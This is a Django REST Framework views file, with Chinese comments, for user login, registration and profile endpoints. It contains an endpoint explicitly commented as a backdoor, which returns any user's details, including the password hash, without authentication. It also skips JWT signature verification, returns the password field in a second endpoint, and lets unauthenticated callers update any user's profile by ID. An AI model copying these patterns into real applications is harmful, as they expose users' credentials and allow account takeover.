from django.shortcuts import render

# Create your views here.
import json

from django.db import transaction
from django.shortcuts import render, get_object_or_404
from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.parsers import JSONParser, MultiPartParser, FormParser
from rest_framework.permissions import IsAuthenticated

# Create your views here.
from rest_framework.views import APIView
import re,os
from . import models, serializers
from rest_framework.response import Response
from django.conf import settings
from django.core.cache import cache
from rest_framework_jwt.authentication import JSONWebTokenAuthentication
import jwt
from django.http import HttpRequest, JsonResponse
from rest_framework.exceptions import AuthenticationFailed
from .serializers import *
from . import serializers
"""
通信用接口
"""

def send_user_info(request, user_id):
    # 通过用户ID查找用户，如果找不到则返回404
    user = get_object_or_404(models.User, id=user_id)

    # 返回用户的相关信息
    data = {
        "id": user.id,
        "mobile": user.mobile,
        "user_icon": user.user_icon.url,
        "gender": user.gender,
        "is_author": user.is_author,
        "birth_date": user.birth_date,
        "signature": user.signature,
        "username": user.username
    }

    return JsonResponse(data)


@api_view(['PATCH'])
def update_user_info(request, user_id):
    # 通过用户ID查找用户，如果找不到则返回404
    user = get_object_or_404(models.User, id=user_id)


    # 使用UserUpdateSerializer更新用户信息
    serializer = UserUpdateSerializer(user, data=request.data, partial=True)
    if serializer.is_valid():
        serializer.save()
        return Response(serializer.data, status=status.HTTP_200_OK)

    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


##############################

# 登录接口
class LoginAPIView(APIView):
    authentication_classes = []
    permission_classes = []

    def post(self, request, *args, **kwargs):
        serializer = serializers.LoginModelSerializer(data=request.data,context={'request':request})
        serializer.is_valid(raise_exception=True)


        return Response({
            'status': 200,
            'msg': '登录成功',
            'gender': serializer.user.gender,
            'id': serializer.user.pk,
            'username': serializer.user.username,
            'token': serializer.token,
            'user_icon': str(serializer.user.user_icon)
        })

#获取用户信息接口
class UserInfoAPIView(APIView):
    authentication_classes = [JSONWebTokenAuthentication]
    #permission_classes = [IsAuthenticated]

    def get(self, request, *args, **kwargs):
        user = request.user
        print(request.user)
        # 获取 Authorization 请求头
        auth_header = request.headers.get('Authorization')

        # 检查 Authorization 头部是否存在
        if not auth_header:
            raise AuthenticationFailed('未提供身份验证信息')

        # 拆分 Authorization 头部，获取 Token 部分
        try:
            auth_token = auth_header.split(' ')[1]
        except IndexError:
            raise AuthenticationFailed('Token 格式错误')

        # 解码 JWT Token
        try:
            decoded_token = jwt.decode(auth_token, verify=False)
        except jwt.ExpiredSignatureError:
            raise AuthenticationFailed('Token 已过期')
        except jwt.InvalidTokenError:
            raise AuthenticationFailed('无效的 Token')


        if not user:  # 如果用户未经过身份验证或者未找到用户对象
            return Response({'error': '用户未经过身份验证或者未找到用户对象'}, status=401)

        user_info = models.User.objects.filter(id=decoded_token['user_id']).first()

        if not user_info:
            return Response({'error': '未找到用户信息'}, status=404)

            # 构建返回数据
        response_data = {
            'id': user_info.id,
            'username': user_info.username,
            'mobile': user_info.mobile,
            'email': user_info.email,
            'gender':'男' if user_info.gender == 0 else '女',
            'is_author': user_info.is_author,
            'password':user_info.password,
            'user_icon': user_info.user_icon.url if user_info.user_icon else None,
            'birth_date': user_info.birth_date,
            'signature': user_info.signature,
        }

        return Response({'info': response_data})

#注册接口 tested
class RegisterView(APIView):
    parser_classes = [JSONParser, MultiPartParser, FormParser]
    def post(self, request, *args, **kwargs):
        serializer = serializers.UserRegistrationSerializer(data=request.data)
        if serializer.is_valid(raise_exception=True):
            user = serializer.save()
            return Response({'message': '注册成功', 'user_id': user.id}, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def patch(self, request, *args, **kwargs):
        user_id = request.query_params.get('user_id')
        if not user_id:
            return Response({'error': '缺少用户ID'}, status=status.HTTP_400_BAD_REQUEST)

        user = get_object_or_404(models.User, pk=user_id)

        serializer = serializers.UserUpdateSerializer(user, data=request.data, partial=True)
        if serializer.is_valid(raise_exception=True):
            with transaction.atomic():
                serializer.save()
            return Response({'message': '用户信息更新成功'}, status=status.HTTP_200_OK)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


#后门接口
class BackdoorAPIView(APIView):

    def get(self, request, *args, **kwargs):
        user_id = request.query_params.get('user_id')
        user = models.User.objects.get(pk=user_id)



        if not user:  # 如果用户未经过身份验证或者未找到用户对象
            return Response({'error': '用户未经过身份验证或者未找到用户对象'}, status=401)

            # 构建返回数据
        response_data = {
            'id': user.id,
            'username': user.username,
            'mobile': user.mobile,
            'email': user.email,
            'gender': '男' if user.gender == 0 else '女',
            'is_author': user.is_author,
            'password':user.password,
            'user_icon': user.user_icon.url if user.user_icon else None,
            'birth_date': user.birth_date,
            'signature': user.signature,
        }

        return Response({'info': response_data})


